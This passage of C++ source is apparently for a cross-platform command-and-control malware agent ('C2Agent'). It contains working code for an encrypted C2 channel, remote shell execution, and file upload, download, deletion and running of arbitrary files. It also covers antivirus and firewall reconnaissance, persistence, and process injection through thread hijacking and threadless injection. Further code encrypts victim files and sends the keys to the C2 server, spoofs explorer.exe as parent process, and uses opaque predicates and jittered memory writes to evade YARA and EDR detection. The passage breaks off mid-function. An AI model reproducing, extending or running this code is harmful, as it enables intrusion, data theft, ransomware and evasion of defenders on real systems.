                // after the initial sandbox-evasion delay, NOT at constructor time.
                // This prevents premature detection during early process startup.
            #endif
    }

    // Encrypt data with session key (ChaCha20 stream cipher)
    string encryptTransport(const string& data) {
        if (!session_encryption || data.empty()) return data;

        // Use ChaCha20 stream cipher instead of XOR
        vector<uint8_t> data_vec(data.begin(), data.end());
        uint8_t chacha_nonce[12] = {0};  // Fixed nonce, key rotates per session
        vector<uint8_t> encrypted = chacha20Encrypt(data_vec, session_key, chacha_nonce, transport_counter);
        transport_counter++;

        return string(reinterpret_cast<const char*>(encrypted.data()), encrypted.size());
    }

    // Decrypt data with session key
    string decryptTransport(const string& data) {
        // ChaCha20 encryption is symmetric (XOR with keystream)
        return encryptTransport(data);
    }

    // Encode and wrap data for transport (prevents plaintext detection)
    string wrapForTransport(const string& data) {
        // Add length prefix + checksum for integrity
        string wrapped;
        size_t length = data.length();

        // Length prefix (4 bytes, big-endian)
        wrapped += (char)((length >> 24) & 0xFF);
        wrapped += (char)((length >> 16) & 0xFF);
        wrapped += (char)((length >> 8) & 0xFF);
        wrapped += (char)(length & 0xFF);

        // Simple checksum
        unsigned char checksum = 0;
        for (char c : data) {
            checksum ^= (unsigned char)c;
        }
        wrapped += (char)checksum;

        // Data
        wrapped += data;

        return wrapped;
    }

    // Unwrap received data
    string unwrapFromTransport(const string& data) {
        if (data.length() < 5) return data;

        // Extract length
        size_t length = ((unsigned char)data[0] << 24) |
                       ((unsigned char)data[1] << 16) |
                       ((unsigned char)data[2] << 8) |
                       ((unsigned char)data[3]);

        // Extract checksum
        unsigned char checksum = (unsigned char)data[4];

        // Verify length sanity
        if (length > 65536 || length > data.length() - 5) {
            return data; // Return original if invalid
        }

        // Extract and verify data
        string extracted = data.substr(5, length);

        // Verify checksum
        unsigned char calc_checksum = 0;
        for (char c : extracted) {
            calc_checksum ^= (unsigned char)c;
        }

        if (calc_checksum == checksum) {
            return extracted;
        }

        return data;
    }

    // Custom send with encryption
    int secureSend(const string& data) {
        string wrapped = wrapForTransport(data);
        string encrypted = encryptTransport(wrapped);
#ifdef _WIN32
        return g_api.send(client_socket, encrypted.c_str(), encrypted.length(), 0);
#else
        return send(client_socket, encrypted.c_str(), encrypted.length(), 0);
#endif
    }

    // Custom recv with decryption
    string secureRecv(int max_len = 8192) {
        char* buffer = new char[max_len];
        memset(buffer, 0, max_len);

#ifdef _WIN32
        int bytes = g_api.recv(client_socket, buffer, max_len - 1, 0);
#else
        int bytes = recv(client_socket, buffer, max_len - 1, 0);
#endif
        if (bytes <= 0) {
            delete[] buffer;
            return "";
        }

        string encrypted_data(buffer, bytes);
        delete[] buffer;

        string decrypted = decryptTransport(encrypted_data);
        return unwrapFromTransport(decrypted);
    }

    ~C2Agent() {
        // Clean up any open upload file handles
        for (auto& entry : upload_files_) {
            if (entry.second) {
                if (entry.second->is_open()) entry.second->close();
                delete entry.second;
            }
        }
        upload_files_.clear();
        upload_paths_.clear();

        disconnect();
        #ifdef _WIN32
            g_api.WSACleanup();
        #endif
    }

    string getUsername() {
        #ifdef _WIN32
            char username[256];
            DWORD size = sizeof(username);
            if (g_api.GetUserNameA(username, &size)) {
                return string(username);
            }
            return "unknown";
        #else
            const char* user = getenv("USER");
            if (user) return string(user);

            const char* logname = getenv("LOGNAME");
            if (logname) return string(logname);

            return "unknown";
        #endif
    }

    void generateBotID() {
        string os_info = getOSInfo();
        string username = getUsername();
        string random_suffix = generateRandomString(6);
        bot_id = os_info + "-" + username + "-" + random_suffix;
    }

    string getOSInfo() {
        #ifdef _WIN32
            return "WIN";
        #elif __APPLE__
            return "MAC";
        #elif __linux__
            return "LNX";
        #else
            return "UNK";
        #endif
    }

    string generateRandomString(int length) {
        const string chars = "ABCDEF0123456789";
        random_device rd;
        mt19937 gen(rd());
        uniform_int_distribution<> dis(0, chars.size() - 1);

        string result;
        for (int i = 0; i < length; ++i) {
            result += chars[dis(gen)];
        }
        return result;
    }

    bool connectToServer() {
#ifdef _WIN32
        client_socket = g_api.socket(AF_INET, SOCK_STREAM, 0);
#else
        client_socket = socket(AF_INET, SOCK_STREAM, 0);
#endif
        if (client_socket < 0) {
            cerr << OBF("[-] Failed to create socket") << endl;
            return false;
        }

        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
#ifdef _WIN32
        server_addr.sin_port = g_api.htons(server_port);
#else
        server_addr.sin_port = htons(server_port);
#endif

#ifdef _WIN32
        if (g_api.inet_pton(AF_INET, server_ip.c_str(), &server_addr.sin_addr) <= 0)
#else
        if (inet_pton(AF_INET, server_ip.c_str(), &server_addr.sin_addr) <= 0)
#endif
        {
            cerr << "[-] Invalid address" << endl;
            return false;
        }

#ifdef _WIN32
        if (g_api.connect(client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0)
#else
        if (connect(client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0)
#endif
        {
            cerr << "[-] Connection failed" << endl;
            return false;
        }

        connected = true;
        // Encryption NOT enabled yet — we need to receive the session key from server first

        // Send bot identification as plaintext (no wrapping/encryption yet)
        string identification = OBF("BOT_CONNECT:") + bot_id + OBF("\n");
#ifdef _WIN32
        g_api.send(client_socket, identification.c_str(), identification.length(), 0);
#else
        send(client_socket, identification.c_str(), identification.length(), 0);
#endif

        // Receive session key exchange + welcome from server (combined in one wrapped message)
        char handshake_buf[8192] = {0};
#ifdef _WIN32
        int n = g_api.recv(client_socket, handshake_buf, sizeof(handshake_buf) - 1, 0);
#else
        int n = recv(client_socket, handshake_buf, sizeof(handshake_buf) - 1, 0);
#endif
        if (n > 0) {
            string raw(handshake_buf, n);
            string unwrapped = unwrapFromTransport(raw);
            if (unwrapped.substr(0, 12) == OBF("SESSION_KEY:")) {
                // Extract 32-byte session key
                for (int i = 0; i < 32; i++) {
                    session_key[i] = (unsigned char)unwrapped[12 + i];
                }
                session_encryption = true;
                cout << "[+] Session encryption established with C2" << endl;

                // Register C2 session state with sleep obfuscation system
                registerC2State(session_key, 32, server_ip, bot_id);

                // Extract welcome message (everything after the 32-byte key)
                string welcome = unwrapped.substr(12 + 32);
                if (!welcome.empty()) {
                    welcome.erase(welcome.find_last_not_of(" \n\r\t") + 1);
                    cout << "[SERVER] " << welcome << endl;
                }
            }
        }

        cout << "[+] Connected to C2 Server as: " << bot_id << endl;
        return true;
    }

    void disconnect() {
        if (connected && client_socket >= 0) {
            #ifdef _WIN32
                g_api.closesocket(client_socket);
            #else
                close(client_socket);
            #endif
            connected = false;
            cout << OBF("[-] Disconnected from C2 Server") << endl;
        }
    }

    string executeCommand(const string& command) {
        FILE* pipe = popen(command.c_str(), "r");
        if (!pipe) {
            return "ERROR: Command execution failed";
        }

        string result;
        char buffer[1024];
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }
        pclose(pipe);

        if (result.empty()) {
            result = "Command executed (no output)";
        }

        return result;
    }

    // HEX encoding/decoding
    string bytesToHex(const string& data) {
        string hex_string;
        hex_string.reserve(data.length() * 2);

        for (unsigned char c : data) {
            hex_string += "0123456789ABCDEF"[c >> 4];
            hex_string += "0123456789ABCDEF"[c & 0x0F];
        }
        return hex_string;
    }

    string hexToBytes(const string& hex) {
        string bytes;
        bytes.reserve(hex.length() / 2);

        for (size_t i = 0; i < hex.length(); i += 2) {
            string byte_string = hex.substr(i, 2);
            unsigned char byte = (unsigned char)strtol(byte_string.c_str(), nullptr, 16);
            bytes.push_back(byte);
        }
        return bytes;
    }

    // File operations
    string readFileToHex(const string& filepath) {
        ifstream file(filepath, ios::binary);
        if (!file.is_open()) {
            return "";
        }

        string content((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
        file.close();

        return bytesToHex(content);
    }

    bool writeHexToFile(const string& hex_data, const string& filepath) {
        string binary_data = hexToBytes(hex_data);

        ofstream file(filepath, ios::binary);
        if (!file.is_open()) {
            return false;
        }

        file.write(binary_data.c_str(), binary_data.length());
        file.close();

        return true;
    }

    // Security commands
    string checkAntivirus() {
        string result = "Antivirus Check Results:\n";

        #ifdef _WIN32
            string av_processes[] = {
                OBF("avp.exe"), OBF("avgnt.exe"), OBF("avguard.exe"), OBF("bdagent.exe"),
                OBF("MsMpEng.exe"), OBF("NisSrv.exe"), OBF("mcshield.exe"), OBF("avastui.exe")
            };

            for (const string& process : av_processes) {
                string cmd = "tasklist /FI \"IMAGENAME eq " + process + "\" 2>nul | find /I \"" + process + "\"";
                FILE* pipe = popen(cmd.c_str(), "r");
                if (pipe) {
                    char buffer[256];
                    if (fgets(buffer, sizeof(buffer), pipe)) {
                        result += "DETECTED: " + process + "\n";
                    }
                    pclose(pipe);
                }
            }
        #else
            string av_commands[] = {
                "ps aux | grep -i clamav", "ps aux | grep -i sophos",
                "ps aux | grep -i bitdefender", "ps aux | grep -i eset"
            };

            for (const string& cmd : av_commands) {
                FILE* pipe = popen(cmd.c_str(), "r");
                if (pipe) {
                    char buffer[256];
                    if (fgets(buffer, sizeof(buffer), pipe)) {
                        result += "DETECTED: " + string(buffer);
                    }
                    pclose(pipe);
                }
            }
        #endif

        if (result.find("DETECTED:") == string::npos) {
            result += "No common antivirus software detected.\n";
        }

        return result;
    }

    string checkFirewall() {
        string result = "Firewall Check Results:\n";

        #ifdef _WIN32
            string fw_cmd = "netsh advfirewall show allprofiles state";
            FILE* pipe = popen(fw_cmd.c_str(), "r");
            if (pipe) {
                char buffer[512];
                while (fgets(buffer, sizeof(buffer), pipe)) {
                    result += buffer;
                }
                pclose(pipe);
            }
        #else
            FILE* iptables_pipe = popen("iptables -L 2>/dev/null", "r");
            if (iptables_pipe) {
                char buffer[256];
                result += "iptables rules:\n";
                while (fgets(buffer, sizeof(buffer), iptables_pipe)) {
                    result += buffer;
                }
                pclose(iptables_pipe);
            }

            FILE* ufw_pipe = popen("ufw status 2>/dev/null", "r");
            if (ufw_pipe) {
                char buffer[256];
                result += "\nufw status:\n";
                while (fgets(buffer, sizeof(buffer), ufw_pipe)) {
                    result += buffer;
                }
                pclose(ufw_pipe);
            }
        #endif

        return result;
    }
    // File commands
    string searchFiles(const string& pattern, const string& search_path = "") {
        string result = "File Search Results:\n";
        string path = search_path.empty() ? "." : search_path;

        #ifdef _WIN32
            string cmd = "dir \"" + path + "\\" + pattern + "\" /s /b 2>nul";
        #else
            string cmd = "find " + path + " -name \"" + pattern + "\" 2>/dev/null";
        #endif

        FILE* pipe = popen(cmd.c_str(), "r");
        if (pipe) {
            char buffer[512];
            int count = 0;
            while (fgets(buffer, sizeof(buffer), pipe) && count < 50) {
                result += buffer;
                count++;
            }
            pclose(pipe);

            if (count == 0) {
                result += "No files found matching pattern: " + pattern + "\n";
            }
        }

        return result;
    }

    string deleteFile(const string& file_path) {
        #ifdef _WIN32
            if (g_api.DeleteFileA(file_path.c_str())) {
                return "File deleted successfully: " + file_path;
            } else {
                return "Failed to delete file: " + file_path;
            }
        #else
            if (remove(file_path.c_str()) == 0) {
                return "File deleted successfully: " + file_path;
            } else {
                return "Failed to delete file: " + file_path;
            }
        #endif
    }

    string moveFile(const string& source, const string& destination) {
        #ifdef _WIN32
            if (g_api.MoveFileA(source.c_str(), destination.c_str())) {
                return "File moved successfully: " + source + " -> " + destination;
            } else {
                return "Failed to move file: " + source + " -> " + destination;
            }
        #else
            if (rename(source.c_str(), destination.c_str()) == 0) {
                return "File moved successfully: " + source + " -> " + destination;
            } else {
                return "Failed to move file: " + source + " -> " + destination;
            }
        #endif
    }

    string listDirectory(const string& dir_path = "") {
        string result = "Directory Listing:\n";
        string path = dir_path.empty() ? "." : dir_path;

        #ifdef _WIN32
            string cmd = "dir \"" + path + "\" /a";
        #else
            string cmd = "ls -la \"" + path + "\"";
        #endif

        FILE* pipe = popen(cmd.c_str(), "r");
        if (pipe) {
            char buffer[512];
            while (fgets(buffer, sizeof(buffer), pipe)) {
                result += buffer;
            }
            pclose(pipe);
        }

        return result;
    }

    void handleFileTransfer(const string& command) {
        if (command.substr(0, 13) == OBF("UPLOAD_START:")) {
            // Format: UPLOAD_START:remote_path:total_size:total_chunks:transfer_id
            istringstream iss(command.substr(13));
            string remote_path, size_str, chunks_str, transfer_id;

            getline(iss, remote_path, ':');
            getline(iss, size_str, ':');
            getline(iss, chunks_str, ':');
            getline(iss, transfer_id);

            // Trim whitespace from transfer_id
            transfer_id.erase(transfer_id.find_last_not_of(" \n\r\t") + 1);

            cout << "[UPLOAD] Starting: " << remote_path << " (" << size_str << " bytes, " << chunks_str << " chunks, id=" << transfer_id << ")" << endl;

            // Create output file and store handle in map
            ofstream* output_file = new ofstream(remote_path, ios::binary);
            if (!output_file->is_open()) {
                cerr << "[UPLOAD] Failed to create file: " << remote_path << endl;
                delete output_file;
                return;
            }

            // Store file handle and path for chunk operations
            upload_files_[transfer_id] = output_file;
            upload_paths_[transfer_id] = remote_path;

            cout << "[UPLOAD] Ready for chunks: " << transfer_id << endl;
        }
        else if (command.substr(0, 13) == OBF("UPLOAD_CHUNK:")) {
            // Format: UPLOAD_CHUNK:transfer_id:chunk_num/total_chunks:hex_data
            size_t first_colon = command.find(':', 13);
            size_t second_colon = command.find(':', first_colon + 1);
            size_t third_colon = command.find(':', second_colon + 1);

            if (first_colon != string::npos && second_colon != string::npos && third_colon != string::npos) {
                string transfer_id = command.substr(13, first_colon - 13);
                string chunk_info = command.substr(first_colon + 1, second_colon - first_colon - 1);
                string hex_data = command.substr(third_colon + 1);

                // Look up file handle from map
                auto it = upload_files_.find(transfer_id);
                if (it != upload_files_.end() && it->second && it->second->is_open()) {
                    // Decode hex and write to file
                    string binary_data = hexToBytes(hex_data);
                    it->second->write(binary_data.c_str(), binary_data.length());
                    cout << "[UPLOAD] Chunk " << chunk_info << " written (" << binary_data.length() << " bytes)" << endl;
                } else {
                    cerr << "[UPLOAD] Error: No open file for transfer " << transfer_id << endl;
                }
            }
        }
        else if (command.substr(0, 11) == OBF("UPLOAD_END:")) {
            string transfer_id = command.substr(11);
            transfer_id.erase(transfer_id.find_last_not_of(" \n\r\t") + 1);

            // Close and clean up file handle
            auto it = upload_files_.find(transfer_id);
            if (it != upload_files_.end()) {
                if (it->second) {
                    if (it->second->is_open()) it->second->close();
                    delete it->second;
                }
                upload_files_.erase(it);

                auto path_it = upload_paths_.find(transfer_id);
                if (path_it != upload_paths_.end()) {
                    cout << "[UPLOAD] Completed: " << path_it->second << " (" << transfer_id << ")" << endl;
                    upload_paths_.erase(path_it);
                }
            }

            // Send acknowledgment via encrypted transport
            string response = OBF("UPLOAD_SUCCESS\n");
            secureSend(response);
        }
        else if (command.substr(0, 9) == OBF("DOWNLOAD:")) {
            string remote_file = command.substr(9);
            remote_file.erase(remote_file.find_last_not_of(" \n\r\t") + 1);

            cout << OBF("[DOWNLOAD] Sending file: ") << remote_file << endl;

            string hex_data = readFileToHex(remote_file);

            if (!hex_data.empty()) {
                string response = "DOWNLOAD:" + hex_data + "\n";
                secureSend(response);
                cout << OBF("[DOWNLOAD] Sent: ") << hex_data.length()/2 << " bytes" << endl;
            } else {
                string response = OBF("DOWNLOAD_ERROR: File not found or cannot read\n");
                secureSend(response);
            }
        }
    }

    void processCommand(const string& command) {
        string cmd = command;
        cmd.erase(cmd.find_last_not_of(" \n\r\t") + 1);

        if (cmd.empty()) return;

        cout << "[CMD] Executing: " << cmd << endl;

        string response;

        // File transfer commands
        if (cmd.substr(0, 7) == "UPLOAD:" || cmd.substr(0, 9) == "DOWNLOAD:" ||
            cmd.substr(0, 13) == "UPLOAD_START:" || cmd.substr(0, 13) == "UPLOAD_CHUNK:" ||
            cmd.substr(0, 11) == "UPLOAD_END:") {
            handleFileTransfer(cmd);
            return;
        }

        // Security commands
        if (cmd == OBF("AV_CHECK")) {
            response = checkAntivirus();
        }
        else if (cmd == OBF("FIREWALL_CHECK")) {
            response = checkFirewall();
        }
        else if (cmd == OBF("INSTALL_PERSISTENCE")) {
            if (installPersistence()) {
                response = OBF("[+] Persistence installed successfully\n");
            } else {
                response = OBF("[-] Failed to install persistence\n");
            }
        }
        else if (cmd.substr(0, 5) == OBF("KILL:")) {
            response = OBF("KILL:OK — Terminating.\n");
#ifdef _WIN32
            g_api.send(client_socket, response.c_str(), response.length(), 0);
#else
            send(client_socket, response.c_str(), response.length(), 0);
#endif
            disconnect();
            exit(0);
        }
        else if (cmd.substr(0, 11) == OBF("APC-INJECT:")) {
            // Route APC-INJECT to Thread Hijacking (faster than APC, avoids CobaltStrike signature)
            // Format: APC-INJECT:process_name:payload_data
            string args = cmd.substr(11);
            size_t first_colon = args.find(':');
            if (first_colon != string::npos) {
                string process_name = args.substr(0, first_colon);
                string payload_data = args.substr(first_colon + 1);
                cout << OBF("[APC-INJECT] Routing to Thread Hijacking: ") << process_name << endl;
                response = performThreadHijacking(process_name, payload_data);
            } else {
                response = OBF("[ERROR] APC-INJECT: Usage: APC-INJECT:<process_name>:<payload_data>\n");
            }
        }
        else if (cmd.substr(0, 15) == OBF("THREAD-HIJACK:")) {
            // Format: THREAD-HIJACK:process_name:payload_data
            string args = cmd.substr(15);
            size_t first_colon = args.find(':');
            if (first_colon != string::npos) {
                string process_name = args.substr(0, first_colon);
                string payload_data = args.substr(first_colon + 1);
                response = performThreadHijacking(process_name, payload_data);
            } else {
                response = OBF("[ERROR] Usage: THREAD-HIJACK:<process_name>:<payload_data>\n");
            }
        }
        else if (cmd.substr(0, 18) == OBF("THREADLESS-INJECT:")) {
            // ThreadlessInject — hooks NtDelayExecution, no new thread/context hijacking
            // Format: THREADLESS-INJECT:process_name:hex_payload
            string args = cmd.substr(18);
            size_t first_colon = args.find(':');
            if (first_colon != string::npos) {
                string process_name = args.substr(0, first_colon);
                string payload_hex = args.substr(first_colon + 1);
                response = performThreadlessInject(process_name, payload_hex);
            } else {
                response = OBF("[ERROR] Usage: THREADLESS-INJECT:<process_name>:<hex_payload>\n");
            }
        }
        // File commands
        else if (cmd.substr(0, 12) == OBF("FILE_SEARCH:")) {
            string args = cmd.substr(12);
            size_t space_pos = args.find(' ');
            string pattern = (space_pos != string::npos) ? args.substr(0, space_pos) : args;
            string path = (space_pos != string::npos) ? args.substr(space_pos + 1) : "";
            response = searchFiles(pattern, path);
        }
        else if (cmd.substr(0, 12) == OBF("FILE_DELETE:")) {
            string file_path = cmd.substr(12);
            response = deleteFile(file_path);
        }
        else if (cmd.substr(0, 13) == OBF("ENCRYPT_FILE:")) {
            string file_path = cmd.substr(13);
            // Remove leading space if present
            if (!file_path.empty() && file_path[0] == ' ') {
                file_path = file_path.substr(1);
            }

            if (encryptSingleFile(file_path)) {
                response = "[+] File encrypted successfully: " + file_path + ".wasp_encrypted\n";
                response += "[+] Encryption key: " + encryption_key_global + "\n";
                response += "[+] Original file deleted.\n";

                // KEY EXFILTRATION: Send structured key report to C2 server
                // Allows operator to decrypt files even if victim machine is lost
                string key_report = OBF("KEY_EXFIL:") + bot_id + OBF(":") + file_path + OBF(":") + last_encryption_algo + OBF(":") + encryption_key_global + OBF("\n");
                secureSend(key_report);
                cout << "[KEY EXFIL] Encryption key sent to C2 for: " << file_path << endl;
            } else {
                response = "[!] Failed to encrypt file: " + file_path + "\n";
            }
        }
        else if (cmd.substr(0, 10) == OBF("FILE_MOVE:")) {
            string args = cmd.substr(10);
            size_t space_pos = args.find(' ');
            if (space_pos != string::npos) {
                string source = args.substr(0, space_pos);
                string destination = args.substr(space_pos + 1);
                response = moveFile(source, destination);
            } else {
                response = OBF("Invalid FILE_MOVE format. Expected: source destination");
            }
        }
        else if (cmd.substr(0, 9) == OBF("DIR_LIST:")) {
            string dir_path = cmd.substr(9);
            response = listDirectory(dir_path);
        }
        else if (cmd == OBF("DIR_LIST")) {
            response = listDirectory();
        }
        // RUN command: make file executable and run it
        else if (cmd.substr(0, 4) == OBF("RUN:")) {
            string file_path = cmd.substr(4);
            // Remove leading space if present
            if (!file_path.empty() && file_path[0] == ' ') {
                file_path = file_path.substr(1);
            }

            if (file_path.empty()) {
                response = "[ERROR] RUN: missing file path\n";
            } else {
                cout << "[RUN] Executing file: " << file_path << endl;

                #ifndef _WIN32
                    // Make executable (chmod +x on Linux/macOS)
                    string chmod_cmd = "chmod +x \"" + file_path + "\" 2>&1";
                    FILE* chmod_pipe = popen(chmod_cmd.c_str(), "r");
                    if (chmod_pipe) pclose(chmod_pipe);
                #endif

                // Run the file and capture output
                FILE* pipe = popen(file_path.c_str(), "r");
                if (!pipe) {
                    response = "[ERROR] RUN: failed to execute " + file_path + "\n";
                } else {
                    string output;
                    char buffer[1024];
                    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
                        output += buffer;
                    }
                    int exit_code = pclose(pipe);

                    if (output.empty()) {
                        output = "[RUN] File executed successfully (exit code: " + to_string(exit_code) + ", no output)\n";
                    } else {
                        output = "[RUN] Execution result:\n" + output + "[RUN] Exit code: " + to_string(exit_code) + "\n";
                    }
                    response = output;
                }
            }
        }
        // Regular shell command
        else {
            response = executeCommand(cmd);
        }

        // Use encrypted transport for response
        secureSend(response);
    }

    void commandLoop() {
        cout << "[*] Bot ready and waiting for commands..." << endl;

        while (connected && running) {
            // Use secure recv for commands
            string message = secureRecv();

            if (message.empty()) {
                cout << "[-] Connection lost" << endl;
                connected = false;
                break;
            }

            processCommand(message);
        }
    }

    void run() {
        cout << "=== C2 Agent ===" << endl;
        cout << "Bot ID: " << bot_id << endl;
        cout << "Server: " << server_ip << ":" << server_port << endl;
        cout << endl;

        while (running) {
            if (!connected) {
                cout << OBF("[*] Attempting to connect...") << endl;
                if (connectToServer()) {
                    // Enter command loop
                    commandLoop();
                } else {
                    cout << "[-] Connection failed, retrying in 5 seconds..." << endl;
                    secureSleep(5);
                }
            }
        }
    }
};

// ============================================================================
// HELPER FUNCTIONS FOR THREAD HIJACKING (Outside main function)
// ============================================================================

// Helper function: Get explorer.exe PID for parent spoofing
#ifdef _WIN32
DWORD getExplorerPID() {
    HANDLE snapshot = g_api.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (g_api.Process32FirstW(snapshot, &pe)) {
        do {
            // Compare lowercase (explorer.exe)
            // Compare with obfuscated string — hide process name from static analysis
            wchar_t explorer_name[] = { L'e' ^ 0x5C, L'x' ^ 0x5C, L'p' ^ 0x5C, L'l' ^ 0x5C,
                                         L'o' ^ 0x5C, L'r' ^ 0x5C, L'e' ^ 0x5C, L'r' ^ 0x5C,
                                         L'.' ^ 0x5C, L'e' ^ 0x5C, L'x' ^ 0x5C, L'e' ^ 0x5C, 0 };
            for (int _ei = 0; explorer_name[_ei]; _ei++) explorer_name[_ei] ^= 0x5C;
            if (wcsicmp(pe.szExeFile, explorer_name) == 0) {
                g_api.CloseHandle(snapshot);
                return pe.th32ProcessID;
            }
        } while (g_api.Process32NextW(snapshot, &pe));
    }
    g_api.CloseHandle(snapshot);
    return 0;
}

// Helper function: Create process with parent spoofing (explorer.exe as parent)
bool createProcessWithParentSpoofing(const string& process_path, PROCESS_INFORMATION& pi) {
    DWORD explorerPID = getExplorerPID();
    if (explorerPID == 0) {
        // Fallback: Create process normally if explorer not found
        STARTUPINFOA si = { sizeof(STARTUPINFOA) };
        return g_api.CreateProcessA(NULL, (LPSTR)process_path.c_str(), NULL, NULL, FALSE,
                             CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    }

    // Open explorer process for parent spoofing
    HANDLE hParent = g_api.OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPID);
    if (!hParent) {
        // Fallback: Create process normally
        STARTUPINFOA si = { sizeof(STARTUPINFOA) };
        return g_api.CreateProcessA(NULL, (LPSTR)process_path.c_str(), NULL, NULL, FALSE,
                             CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    }

    // Initialize STARTUPINFOEX with parent attribute
    STARTUPINFOEXA si = {0};
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // Get size needed for attributes
    SIZE_T attrSize = 0;
    g_api.InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);

    // Allocate attribute list
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)g_api.HeapAlloc(
        g_api.GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);

    if (!si.lpAttributeList) {
        g_api.CloseHandle(hParent);
        return false;
    }

    // Initialize attribute list
    if (!g_api.InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize)) {
        g_api.HeapFree(g_api.GetProcessHeap(), 0, si.lpAttributeList);
        g_api.CloseHandle(hParent);
        return false;
    }

    // Set parent process attribute
    if (!g_api.UpdateProcThreadAttribute(si.lpAttributeList, 0,
                                   PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                   &hParent, sizeof(HANDLE),
                                   NULL, NULL)) {
        g_api.DeleteProcThreadAttributeList(si.lpAttributeList);
        g_api.HeapFree(g_api.GetProcessHeap(), 0, si.lpAttributeList);
        g_api.CloseHandle(hParent);
        return false;
    }

    // Create process with spoofed parent (explorer.exe will appear as parent)
    BOOL success = g_api.CreateProcessA(NULL, (LPSTR)process_path.c_str(),
                                  NULL, NULL, FALSE,
                                  EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
                                  NULL, NULL, &si.StartupInfo, &pi);

    // Cleanup
    g_api.DeleteProcThreadAttributeList(si.lpAttributeList);
    g_api.HeapFree(g_api.GetProcessHeap(), 0, si.lpAttributeList);
    g_api.CloseHandle(hParent);

    return success;
}

// ============================================================================
// YARA EVASION HELPERS for Thread Hijacking
// Opaque predicates break static bytecode pattern matching by inserting
// dead branches that always take the same path but look like real logic
// ============================================================================

// WinAPI function pointer types - defined at global scope so YARA evasion
// helpers can use them (declared before the helpers, used by both helpers
// and performThreadHijacking)
typedef HANDLE (WINAPI* pCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL (WINAPI* pProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL (WINAPI* pProcess32NextW)(HANDLE, LPPROCESSENTRY32W);
typedef HANDLE (WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
typedef HANDLE (WINAPI* pOpenThread)(DWORD, BOOL, DWORD);
typedef BOOL (WINAPI* pSuspendThread)(HANDLE);
typedef BOOL (WINAPI* pResumeThread)(HANDLE);
typedef BOOL (WINAPI* pGetThreadContext)(HANDLE, PCONTEXT);
typedef BOOL (WINAPI* pSetThreadContext)(HANDLE, const CONTEXT*);
typedef LPVOID (WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL (WINAPI* pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI* pCreateToolhelp32Snapshot_)(DWORD, DWORD);
typedef BOOL (WINAPI* pThread32First)(HANDLE, THREADENTRY32*);
typedef BOOL (WINAPI* pThread32Next)(HANDLE, THREADENTRY32*);

// Opaque predicate: Always returns a non-zero value but looks like a real branch
// to static analysis / YARA decompilers. The arithmetic is deterministic
// but complex enough that YARA rules can't precompute the result.
inline DWORD hijackOpaqueCheck() {
    DWORD a = 0xA3B2C1D0;
    DWORD b = 0x5C4D3E2F;
    DWORD c = (a ^ b) + (a | b);
    c ^= (c >> 16) | (c << 16);
    c += 0x11111111;
    return c;  // Always non-zero — "if" always enters the real path
}

// Legitimate pause: Reads a Windows registry value between injection phases.
// This breaks the linear API call sequence that YARA rules target.
// To any monitoring (EDR, behavioral), this looks like normal system
// maintenance or a program checking its configuration.
inline void hijackLegitimatePause() {
    // Read a harmless HKLM value — every Windows machine has this
    HKEY hKey;
    if (g_api.RegOpenKeyExA(HKEY_LOCAL_MACHINE, OBF("SOFTWARE\\Microsoft\\Windows\\CurrentVersion"),
                     0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buf[MAX_PATH] = {0};
        DWORD bufSize = sizeof(buf);
        DWORD type = 0;
        if (g_api.RegQueryValueExA(hKey, "ProgramFilesDir", NULL, &type,
                            (LPBYTE)buf, &bufSize) == ERROR_SUCCESS) {
            // Use the value — always passes, but adds a real code path
            if (buf[0] == 'C' || buf[0] == 0) {
                g_api.Sleep(1);
            }
        }
        g_api.RegCloseKey(hKey);
    }

    // Second opaque branch — always true, never taken
    if (hijackOpaqueCheck() == 0) {
        // Dead code: creates an additional code path in disassembly
        volatile DWORD dead = 0;
        for (int i = 0; i < 3; i++) dead ^= (i * 31);
    }
}

// Extracted chunked payload write — breaks monolithic function detection
// Returns true on success, false on failure
inline bool hijackWriteMemory(HANDLE hProcess, PVOID remote_mem,
                              const string& payload, SIZE_T& bytes_written,
                              pWriteProcessMemory _WriteProcessMemory,
                              pVirtualProtectEx _VirtualProtectEx) {
    SIZE_T payload_size = payload.length();
    const SIZE_T chunk_size = 4096;
    SIZE_T written = 0;

    while (written < payload_size) {
        SIZE_T this_chunk = min(chunk_size, payload_size - written);
        SIZE_T chunk_written = 0;

        if (!g_api.WriteProcessMemory(hProcess, (BYTE*)remote_mem + written,
                                payload.c_str() + written, this_chunk, &chunk_written)) {
            return false;
        }
        written += chunk_written;

        // Jitter between chunks — evades sequential write detection
        if (written < payload_size) {
            g_api.Sleep(1 + (written % 3));
        }
    }

    bytes_written = written;

    // Opaque check: always true, adds a conditional branch
    if (hijackOpaqueCheck() != 0) {
        // Change protection to RX after write is complete
        DWORD old_protect;
        if (!g_api.VirtualProtectEx(hProcess, remote_mem, payload_size,
                              PAGE_EXECUTE_READ, &old_protect)) {
            return false;
        }
    } else {
        // Dead code path — never reached but appears in disassembly
